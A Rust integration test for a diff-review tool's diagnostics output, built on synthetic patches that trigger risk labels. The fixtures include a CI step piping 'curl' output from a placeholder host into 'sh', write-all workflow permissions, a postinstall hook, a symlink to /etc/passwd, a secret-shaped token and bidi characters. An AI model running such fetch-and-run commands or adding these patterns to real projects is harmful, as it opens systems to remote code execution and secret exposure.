//! F5a: `--diagnostics` on the command line, from the outside. The document is the in-process
//! builder's bytes, on `--stdin-patch`, the Git selections and `<old> <new>`; the input forms keep
//! their refusals before it; every pinned code is produced by some input; the text form prints no
//! text of the change but the escaped path; `--fail-on` gives the verdict `--rank` gives.
#![cfg(unix)]
#![expect(
    clippy::disallowed_methods,
    reason = "integration test: drives git and the binary"
)]

use deep_diff_forge_testkit::Scratch;
use serde_json::Value;
use std::collections::BTreeSet;
use std::fmt::Write as _;
use std::io::Write as _;
use std::path::Path;
use std::process::{Command, Stdio};

/// Git with no user or system configuration.
const ISOLATE: [(&str, &str); 2] = [
    ("GIT_CONFIG_GLOBAL", "/dev/null"),
    ("GIT_CONFIG_NOSYSTEM", "1"),
];

/// Where the run's stdout goes.
#[derive(Clone, Copy, Debug, PartialEq)]
enum Out {
    Piped,
    /// A pipe whose reader has gone (`| head` that has finished).
    Closed,
    /// `/dev/full`: every write fails.
    Full,
}

/// Run the binary with `args`, `stdin` and stdout as `out` says: (exit code, stdout, stderr).
fn run_to(args: &[&str], stdin: &[u8], out: Out) -> (Option<i32>, String, String) {
    let mut command = Command::new(env!("CARGO_BIN_EXE_deep-diff-forge"));
    command
        .args(args)
        .envs(ISOLATE)
        .stdin(Stdio::piped())
        .stderr(Stdio::piped());
    match out {
        Out::Piped => command.stdout(Stdio::piped()),
        Out::Closed => {
            let (reader, writer) = std::io::pipe().unwrap();
            drop(reader);
            command.stdout(Stdio::from(writer))
        }
        Out::Full => command.stdout(Stdio::from(
            std::fs::OpenOptions::new()
                .write(true)
                .open("/dev/full")
                .unwrap(),
        )),
    };
    let mut child = command.spawn().unwrap();
    let _ = child.stdin.take().unwrap().write_all(stdin);
    let out = child.wait_with_output().unwrap();
    (
        out.status.code(),
        String::from_utf8_lossy(&out.stdout).into_owned(),
        String::from_utf8_lossy(&out.stderr).into_owned(),
    )
}

fn run(args: &[&str], stdin: &[u8]) -> (Option<i32>, String, String) {
    run_to(args, stdin, Out::Piped)
}

/// `--stdin-patch --diagnostics --json` on `patch`, parsed; the run must pass.
fn document(patch: &[u8]) -> Value {
    let (code, stdout, stderr) = run(&["--stdin-patch", "--diagnostics", "--json"], patch);
    assert_eq!(code, Some(0), "{stderr}");
    serde_json::from_str(&stdout).unwrap()
}

/// The in-process builder's document of `patch`, as the command reads it.
fn builder(patch: &[u8]) -> String {
    let review = deep_diff_forge_patch::SealedReview::new(
        patch,
        deep_diff_forge_patch::InputGuards {
            files: false,
            hunks: false,
        },
        env!("CARGO_PKG_VERSION"),
    )
    .unwrap();
    let ranked = deep_diff_forge_graph::rank(review.files());
    deep_diff_forge_graph::diagnostics(review.seal(), &ranked).to_json()
}

/// A section of `path` adding `added` after one context line and removing `removed` after them.
fn section(path: &str, added: &[String], removed: &[&str]) -> String {
    let mut text = format!(
        "--- a/{path}\n+++ b/{path}\n@@ -1,{} +1,{} @@\n ctx\n",
        removed.len() + 1,
        added.len() + 1
    );
    for line in added {
        let _ = writeln!(text, "+{line}");
    }
    for line in removed {
        let _ = writeln!(text, "-{line}");
    }
    text
}

/// A token of the `glpat-` shape, assembled here so no secret-shaped literal is in the tree.
fn token() -> String {
    ["gl", "pat-", "Ab3dEf6hIj9kLm2nOp5q"].concat()
}

/// Per evidence label: the directory and file name of its file, a filler line raising another
/// label, and the lines that raise it (added; for `test_removed`, removed).
fn evidence_cases() -> Vec<(&'static str, &'static str, String, Vec<String>)> {
    let s = |text: &str| text.to_owned();
    vec![
        (
            "unsafe_added",
            "x.rs",
            s("#[allow(dead_code)]"),
            vec![s("unsafe { f() }")],
        ),
        (
            "check_suppressed",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("#[allow(dead_code)]")],
        ),
        (
            "process_spawn",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("std::process::Command::new(\"ls\");")],
        ),
        (
            "network_fetch",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("let r = reqwest::get(\"http://example.invalid/x\");")],
        ),
        (
            "dynamic_eval",
            "x.js",
            s("child_process.exec(x);"),
            vec![s("eval(x);")],
        ),
        (
            "ci_privilege",
            "ci.yml",
            s("  run: curl -s http://example.invalid/x | sh"),
            vec![s("on: pull_request_target"), s("permissions: write-all")],
        ),
        (
            "build_hook",
            "package.json",
            format!("  \"t\": \"{}\",", token()),
            vec![s("  \"postinstall\": \"node x.js\",")],
        ),
        (
            "secret_like",
            "x.rs",
            s("unsafe { f() }"),
            vec![format!("let t = \"{}\";", token())],
        ),
        (
            "test_skipped",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("#[ignore]"), s("#[test]"), s("fn t() {}")],
        ),
        (
            "trivial_assert",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("assert!(true);")],
        ),
        (
            "stub_added",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("todo!()")],
        ),
        (
            "error_swallowed",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("match f() { Ok(v) => v, Err(_) => {} }")],
        ),
        (
            "panic_path_added",
            "x.rs",
            s("unsafe { f() }"),
            vec![s("x.unwrap();")],
        ),
        (
            "test_removed",
            "t.rs",
            s("unsafe { f() }"),
            vec![s("#[test]"), s("fn t() { assert_eq!(f(), 1); }")],
        ),
    ]
}

/// One patch whose files raise, between them, every code of stdin input: each evidence label
/// alone (`@line`) and after 33 filler rows (`@file`, its rows cut), and every path label.
fn every_stdin_code() -> String {
    let mut patch = String::new();
    for (label, name, filler, lines) in evidence_cases() {
        for (anchor, fill) in [("line", 0), ("file", 33)] {
            let file = match label {
                "ci_privilege" => format!(".github/workflows/{anchor}.yml"),
                "test_removed" => format!("tests/{anchor}.rs"),
                _ => format!("{anchor}/{label}/{name}"),
            };
            let mut added = vec![filler.clone(); fill];
            let removed: Vec<&str> = if label == "test_removed" {
                lines.iter().map(String::as_str).collect()
            } else {
                added.extend(lines.iter().cloned());
                Vec::new()
            };
            patch.push_str(&section(&file, &added, &removed));
        }
    }
    patch.push_str("--- a/src/m.rs\n+++ b/src/m.rs\n");
    for i in 0..12 {
        let (old, new) = (10 * i + 1, 11 * i + 1);
        let _ = write!(
            patch,
            "@@ -{old},2 +{new},3 @@\n c{i}\n+fn g{i}() {{}}\n c{i}b\n"
        );
    }
    let large: Vec<String> = (0..600).map(|i| format!("fn f{i}() {{}}")).collect();
    for (path, line) in [
        ("src/lib.rs", "pub fn api() {}"),
        ("Cargo.lock", "x = 1"),
        ("tests/u.rs", "fn h() {}"),
        ("vendor/x/lib.rs", "fn v() {}"),
        ("src/a\u{202E}b.rs", "fn b() {}"),
        ("src/hz.rs", "let s = \"a\u{202E}b\";"),
    ] {
        patch.push_str(&section(path, &[line.to_owned()], &[]));
    }
    patch.push_str(&section("src/big.rs", &large, &[]));
    patch.push_str("diff --git a/run.sh b/run.sh\nnew file mode 100755\n--- /dev/null\n+++ b/run.sh\n@@ -0,0 +1 @@\n+echo hi\n");
    patch.push_str("diff --git a/l b/l\nnew file mode 120000\n--- /dev/null\n+++ b/l\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\n");
    patch.push_str("diff --git a/img.png b/img.png\nnew file mode 100644\nindex 0000000..1234567\nBinary files /dev/null and b/img.png differ\n");
    patch.push_str("diff --git a/tests/d.rs b/tests/d.rs\ndeleted file mode 100644\n--- a/tests/d.rs\n+++ /dev/null\n@@ -1 +0,0 @@\n-fn d() {}\n");
    patch
}

/// A Git repository in `scratch` with one commit `base` and one commit `change`.
fn repository(scratch: &Scratch, base: &[(&str, &[u8])], change: &[(&str, &[u8])]) {
    for (files, message) in [(base, "base"), (change, "change")] {
        if message == "base" {
            git(scratch.path(), &["init", "-q"]);
        }
        for (path, bytes) in files {
            let path = scratch.join(path);
            std::fs::create_dir_all(path.parent().unwrap()).unwrap();
            std::fs::write(path, bytes).unwrap();
        }
        git(scratch.path(), &["add", "-A"]);
        git(scratch.path(), &["commit", "-q", "-m", message]);
    }
}

/// Git in `root` with a fixed identity and no signing; its stdout.
fn git(root: &Path, args: &[&str]) -> Vec<u8> {
    let out = Command::new("git")
        .current_dir(root)
        .envs(ISOLATE)
        .args([
            "-c",
            "user.name=ddf",
            "-c",
            "user.email=ddf@example.invalid",
        ])
        .args([
            "-c",
            "commit.gpgSign=false",
            "-c",
            "init.defaultBranch=main",
        ])
        .args(args)
        .output()
        .unwrap();
    assert!(out.status.success(), "git {args:?}: {out:?}");
    out.stdout
}

/// `--git-range HEAD~1..HEAD --repo root` with `mode`.
fn range(root: &Path, mode: &[&str]) -> (Option<i32>, String, String) {
    let mut args = vec![
        "--git-range",
        "HEAD~1..HEAD",
        "--repo",
        root.to_str().unwrap(),
    ];
    args.extend(mode);
    run(&args, b"")
}

/// The codes of a document.
fn codes(doc: &Value) -> BTreeSet<String> {
    doc["diagnostics"]
        .as_array()
        .unwrap()
        .iter()
        .map(|d| d["code"].as_str().unwrap().to_owned())
        .collect()
}

/// Every code of the pinned table is produced through the binary: the stdin codes by one patch,
/// `diff_suppressed@file` by a Git range whose source a `-diff` attribute hides. The corpus never
/// produces ten evidence-label `@file` codes nor `diff_suppressed@file` (lane F1.a2's figures).
#[test]
fn every_pinned_code_is_produced_through_the_binary() {
    let pinned: BTreeSet<String> = std::fs::read_to_string(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../fixtures/diagnostics/codes.v0.txt"
    ))
    .unwrap()
    .lines()
    .map(str::to_owned)
    .collect();
    let mut made = codes(&document(every_stdin_code().as_bytes()));
    let scratch = Scratch::new("diagnostics-codes");
    repository(
        &scratch,
        &[
            (".gitattributes", b"*.rs -diff\n"),
            ("src/m.rs", b"fn m() {}\n"),
        ],
        &[("src/m.rs", b"fn m() {}\nfn n() {}\n")],
    );
    let (code, stdout, stderr) = range(scratch.path(), &["--diagnostics", "--json"]);
    assert_eq!(code, Some(0), "{stderr}");
    made.extend(codes(&serde_json::from_str(&stdout).unwrap()));
    let missing: Vec<&String> = pinned.difference(&made).collect();
    let unpinned: Vec<&String> = made.difference(&pinned).collect();
    assert!(
        missing.is_empty(),
        "pinned codes no input produced: {missing:?}"
    );
    assert!(unpinned.is_empty(), "codes not pinned: {unpinned:?}");
}

/// Patches for the byte comparison: the evidence and ranking cases of the eval corpus and the
/// patch of every code.
fn patches() -> Vec<Vec<u8>> {
    let root = concat!(env!("CARGO_MANIFEST_DIR"), "/../../fixtures/eval");
    let mut patches = vec![every_stdin_code().into_bytes()];
    for dir in ["evidence", "ranking"] {
        let mut paths: Vec<_> = std::fs::read_dir(Path::new(root).join(dir))
            .unwrap()
            .map(|e| e.unwrap().path())
            .filter(|p| p.extension().is_some_and(|e| e == "patch"))
            .collect();
        paths.sort();
        patches.extend(paths.iter().map(|p| std::fs::read(p).unwrap()));
    }
    patches
}

/// `--stdin-patch --diagnostics --json` prints the in-process builder's document byte for byte
/// (no second writer), with `judge` as a producer that runs no judge writes it, and the same
/// (path, label) pairs as `--rank --json`'s `signals[]`.
#[test]
fn the_document_is_the_builders_byte_for_byte() {
    let mut compared = 0;
    for patch in patches() {
        let (code, stdout, stderr) = run(&["--stdin-patch", "--diagnostics", "--json"], &patch);
        let (rank_code, rank, _) = run(&["--stdin-patch", "--rank", "--json"], &patch);
        assert_eq!(code, rank_code, "{stderr}");
        if code != Some(0) {
            continue;
        }
        assert_eq!(
            stdout,
            builder(&patch),
            "the command's document is not the builder's"
        );
        let doc: Value = serde_json::from_str(&stdout).unwrap();
        assert_eq!(
            doc["judge"],
            serde_json::json!({"state": "unknown", "ranker_sha256": null})
        );
        let rank: Value = serde_json::from_str(&rank).unwrap();
        let pairs = |list: &Value, key: &str| -> BTreeSet<(String, String)> {
            let mut set = BTreeSet::new();
            for item in list.as_array().unwrap() {
                let path = item["path"].as_str().unwrap().to_owned();
                match item[key].as_array() {
                    Some(labels) => set.extend(
                        labels
                            .iter()
                            .map(|l| (path.clone(), l.as_str().unwrap().to_owned())),
                    ),
                    None => {
                        set.insert((path, item[key].as_str().unwrap().to_owned()));
                    }
                }
            }
            set
        };
        assert_eq!(
            pairs(&doc["diagnostics"], "label"),
            pairs(&rank["ranked"], "signals")
        );
        assert_eq!(doc["input_sha256"], rank["input_sha256"]);
        compared += 1;
    }
    assert!(compared >= 10, "{compared} documents compared");
}

/// The document with what legitimately differs between input forms removed: `input_sha256` and
/// the keys (they hash each form's patch bytes) and, with `paths`, each path.
fn normalised(text: &str, paths: bool) -> Value {
    let mut doc: Value = serde_json::from_str(text).unwrap();
    doc.as_object_mut().unwrap().remove("input_sha256");
    for d in doc["diagnostics"].as_array_mut().unwrap() {
        d.as_object_mut().unwrap().remove("key");
        if paths {
            d.as_object_mut().unwrap().remove("path");
        }
    }
    doc
}

/// One change through the three inputs gives one document, except `input_sha256` and the keys
/// (each input's patch bytes differ: Git's range carries full blob names) and, for `<old> <new>`,
/// the paths, which are the two paths as given.
#[test]
fn the_three_input_forms_give_one_document() {
    let (old, new): (&[u8], &[u8]) = (
        b"fn a() {}\n",
        b"fn a() {}\nfn b() { unsafe { f() } }\n#[ignore]\nfn c() { x.unwrap(); }\n",
    );
    let scratch = Scratch::new("diagnostics-forms");
    repository(&scratch, &[("src/a.rs", old)], &[("src/a.rs", new)]);
    let (code, from_git, stderr) = range(scratch.path(), &["--diagnostics", "--json"]);
    assert_eq!(code, Some(0), "{stderr}");
    let patch = git(scratch.path(), &["diff", "HEAD~1", "HEAD"]);
    let (code, from_stdin, stderr) = run(&["--stdin-patch", "--diagnostics", "--json"], &patch);
    assert_eq!(code, Some(0), "{stderr}");
    assert!(
        from_git.contains("\"code\": \"unsafe_added@line\""),
        "{from_git}"
    );
    assert_eq!(normalised(&from_git, false), normalised(&from_stdin, false));
    let pair = Scratch::new("diagnostics-pair");
    let (a, b) = (pair.join("old.rs"), pair.join("new.rs"));
    std::fs::write(&a, old).unwrap();
    std::fs::write(&b, new).unwrap();
    let (a, b) = (a.to_str().unwrap(), b.to_str().unwrap());
    let (code, from_pair, stderr) = run(&["--", a, b, "--diagnostics", "--json"], b"");
    assert_eq!(code, Some(0), "{stderr}");
    assert_eq!(normalised(&from_pair, true), normalised(&from_stdin, true));
    let doc: Value = serde_json::from_str(&from_pair).unwrap();
    assert!(
        doc["diagnostics"][0]["path"]
            .as_str()
            .unwrap()
            .ends_with("new.rs")
    );
}

/// The refusals of the input forms stand before the document, as under `--rank`: a parse error
/// and no patch in the input (exit 4), `--require-files` and `--require-hunks` (exit 7), each
/// with the same stderr and an empty stdout; `--allow-empty` documents an empty change.
#[test]
fn the_input_refusals_stand_before_the_document() {
    let cases: [(&[&str], &str, i32); 6] = [
        (&[], "--- a/x\n+++ b/x\n@@ -1,2 +1,2 @@\n+a\n", 4),
        (&[], "", 4),
        (&[], "a commit message alone\n", 4),
        (&["--require-files"], "", 7),
        (
            &["--require-hunks"],
            "diff --git a/x b/x\nnew file mode 100644\n",
            7,
        ),
        (
            &["--require-hunks"],
            "diff --git a/x b/y\nsimilarity index 100%\nrename from x\nrename to y\n",
            7,
        ),
    ];
    for (guards, input, want) in cases {
        let mut rank = vec!["--stdin-patch", "--rank", "--json"];
        rank.extend(guards);
        let (code, stdout, refusal) = run(&rank, input.as_bytes());
        assert_eq!(
            (code, stdout.as_str()),
            (Some(want), ""),
            "{rank:?} {input:?}"
        );
        for mode in [&["--diagnostics", "--json"][..], &["--diagnostics"][..]] {
            let mut args = vec!["--stdin-patch"];
            args.extend(mode);
            args.extend(guards);
            let found = run(&args, input.as_bytes());
            assert_eq!(
                found,
                (Some(want), String::new(), refusal.clone()),
                "{args:?} {input:?}"
            );
        }
    }
    for input in ["", "a commit message alone\n"] {
        let doc: Value = {
            let args = ["--stdin-patch", "--diagnostics", "--json", "--allow-empty"];
            let (code, stdout, stderr) = run(&args, input.as_bytes());
            assert_eq!(code, Some(0), "{stderr}");
            serde_json::from_str(&stdout).unwrap()
        };
        assert_eq!(
            (&doc["counts"]["files"], &doc["diagnostics"]),
            (&Value::from(0), &serde_json::json!([]))
        );
    }
}

/// The canary rule: the text form and the JSON document hold no text of the change but the path,
/// whose bidi control the text form shows escaped. A marker stands in the hunk heading, context,
/// added and removed lines and an old path; a secret-shaped token and a bidi control in a line.
/// No agent text names `explain signal` (it is for people; design section 3.4).
#[test]
fn the_text_form_prints_no_text_of_the_change() {
    let marker = ["QX", "MARKER", "41"].concat();
    let patch = format!(
        "--- a/src/k\u{202E}.rs\n+++ b/src/k\u{202E}.rs\n@@ -1,2 +1,5 @@ fn {marker}()\n ctx {marker}\n-let old = {marker};\n+let t = \"{}\"; // {marker}\n+unsafe {{ {marker}() }}\n+let s = \"a\u{202E}b {marker}\";\n+x.unwrap(); // {marker}\n ctx\ndiff --git a/{marker}.rs b/src/renamed.rs\nsimilarity index 90%\nrename from {marker}.rs\nrename to src/renamed.rs\n--- a/{marker}.rs\n+++ b/src/renamed.rs\n@@ -1 +1,2 @@\n fn {marker}() {{}}\n+#[ignore]\n",
        token()
    );
    let (code, text, stderr) = run(&["--stdin-patch", "--diagnostics"], patch.as_bytes());
    assert_eq!(code, Some(0), "{stderr}");
    let (_, json, _) = run(
        &["--stdin-patch", "--diagnostics", "--json"],
        patch.as_bytes(),
    );
    let (_, gated, refusal) = run(
        &["--stdin-patch", "--diagnostics", "--fail-on", "security"],
        patch.as_bytes(),
    );
    assert!(
        text.contains("\"src/k\\u{202e}.rs\":"),
        "the path escaped and quoted: {text}"
    );
    assert!(
        text.contains("hazardous_text@line") && text.contains("unsafe_added@line"),
        "{text}"
    );
    for (what, out) in [
        ("text", &text),
        ("json", &json),
        ("gated", &gated),
        ("stderr", &refusal),
    ] {
        for secret in [
            marker.as_str(),
            token().as_str(),
            "\u{202E}",
            "explain signal",
        ] {
            assert!(!out.contains(secret), "{what} holds {secret:?}: {out}");
        }
    }
}

/// `--diagnostics --fail-on` decides as `--rank --fail-on` does on the same input (it reads the
/// ranking's `signals[]` and `evidence_truncated`, not the document), prints the document of the
/// run without the flag first, and keeps exit 7 when stdout is closed or full.
#[test]
fn fail_on_with_diagnostics_is_the_verdict_of_rank() {
    let cap: Vec<String> = (0..34)
        .map(|i| format!("// see #[allow(dead_code)] note {i}"))
        .chain(["unsafe { f() }".to_owned()])
        .collect();
    let cases = [
        (
            section("src/b.rs", &["let t = \"a\u{202E}b\";".to_owned()], &[]),
            "security",
            7,
        ),
        (section("src/a.rs", &cap, &[]), "unsafe_added", 7),
        (section("src/a.rs", &cap, &[]), "shape", 7),
        (
            section("src/c.rs", &["fn c() {}".to_owned()], &[]),
            "secret_like,integrity",
            0,
        ),
    ];
    for (patch, list, want) in cases {
        let (rank_code, _, rank_stderr) = run(
            &["--stdin-patch", "--rank", "--json", "--fail-on", list],
            patch.as_bytes(),
        );
        assert_eq!(rank_code, Some(want), "{list}: {rank_stderr}");
        for mode in [&["--diagnostics", "--json"][..], &["--diagnostics"][..]] {
            let mut args = vec!["--stdin-patch"];
            args.extend(mode);
            let (code, plain, _) = run(&args, patch.as_bytes());
            assert_eq!(code, Some(0));
            args.extend(["--fail-on", list]);
            let (code, document, stderr) = run(&args, patch.as_bytes());
            assert_eq!((code, &stderr), (Some(want), &rank_stderr), "{args:?}");
            assert_eq!(document, plain, "--fail-on changed the document: {args:?}");
            if want != 7 {
                continue;
            }
            for out in [Out::Closed, Out::Full] {
                if out == Out::Full && !Path::new("/dev/full").exists() {
                    continue; // Linux has it; the gate runs on Linux
                }
                let (code, _, stderr) = run_to(&args, patch.as_bytes(), out);
                assert_eq!(
                    (code, &stderr),
                    (Some(7), &rank_stderr),
                    "{args:?} with stdout {out:?}"
                );
            }
        }
    }
}

/// `schema diagnostics` is a JSON Schema every document meets: each member it requires is
/// written, each member written is described, codes and labels are the pinned ones.
#[test]
fn schema_diagnostics_describes_every_document() {
    let (code, stdout, stderr) = run(&["schema", "diagnostics"], b"");
    assert_eq!(code, Some(0), "{stderr}");
    let schema: Value = serde_json::from_str(&stdout).unwrap();
    assert_eq!(schema["title"], "deep-diff-forge.diagnostics.v0");
    let item = &schema["properties"]["diagnostics"]["items"];
    let fits = |value: &Value, schema: &Value, at: &str| {
        let required = schema["required"].as_array().unwrap();
        let properties = schema["properties"].as_object().unwrap();
        let object = value.as_object().unwrap();
        for name in required {
            assert!(
                object.contains_key(name.as_str().unwrap()),
                "{at}: {name} missing"
            );
        }
        for (name, member) in object {
            let rule = properties
                .get(name)
                .unwrap_or_else(|| panic!("{at}: {name} undescribed"));
            if let Some(allowed) = rule["enum"].as_array() {
                assert!(
                    allowed.contains(member),
                    "{at}: {name} = {member} not in {allowed:?}"
                );
            }
        }
    };
    let mut seen = BTreeSet::new();
    for patch in patches() {
        let (code, stdout, _) = run(&["--stdin-patch", "--diagnostics", "--json"], &patch);
        if code != Some(0) {
            continue;
        }
        let doc: Value = serde_json::from_str(&stdout).unwrap();
        fits(&doc, &schema, "document");
        for d in doc["diagnostics"].as_array().unwrap() {
            fits(d, item, d["code"].as_str().unwrap());
            seen.extend(d.as_object().unwrap().keys().cloned());
        }
    }
    assert!(
        seen.contains("test_likely"),
        "no document wrote test_likely: {seen:?}"
    );
    let codes: BTreeSet<&str> = item["properties"]["code"]["enum"]
        .as_array()
        .unwrap()
        .iter()
        .map(|c| c.as_str().unwrap())
        .collect();
    let pinned = std::fs::read_to_string(concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/../../fixtures/diagnostics/codes.v0.txt"
    ))
    .unwrap();
    assert_eq!(codes, pinned.lines().collect::<BTreeSet<_>>());
}

/// The text form, whole: one line per diagnostic for an agent in document order, a file's
/// `floor_only` readings counted and not listed (an `unsafe` in a raw string over lines, which
/// only the 0.8.3 reading finds), each named id with its sentence, then the counts.
#[test]
fn the_text_form_lists_agent_diagnostics_and_counts_the_rest() {
    let patch = "--- a/src/app.rs\n+++ b/src/app.rs\n@@ -1,2 +1,5 @@\n // ctx\n+    let s = r#\"\n+    unsafe { f() }\n+    \"#;\n // ctx\n--- a/src/b.rs\n+++ b/src/b.rs\n@@ -1 +1,2 @@\n fn a() {}\n+fn b() { unsafe { f() } }\n";
    let (code, text, stderr) = run(&["--stdin-patch", "--diagnostics"], patch.as_bytes());
    assert_eq!(code, Some(0), "{stderr}");
    let sentence = |id: &str| -> String {
        let doc = document(patch.as_bytes());
        format!("{id}: {}", doc["texts"][id].as_str().unwrap())
    };
    let want = [
        "\"src/b.rs\":2: unsafe_added@line (security, new side); repairs: unsafe_added:a1, unsafe_added:a2".to_owned(),
        "\"src/app.rs\": 1 readings kept for compatibility with 0.8.3 are for a person; leave the text that carries them".to_owned(),
        sentence("unsafe_added:a1"),
        sentence("unsafe_added:a2"),
        "counts: files 2, diagnostics 2, agent 1, person 1, cut_files 0".to_owned(),
    ];
    assert_eq!(text.lines().collect::<Vec<_>>(), want, "{text}");
}
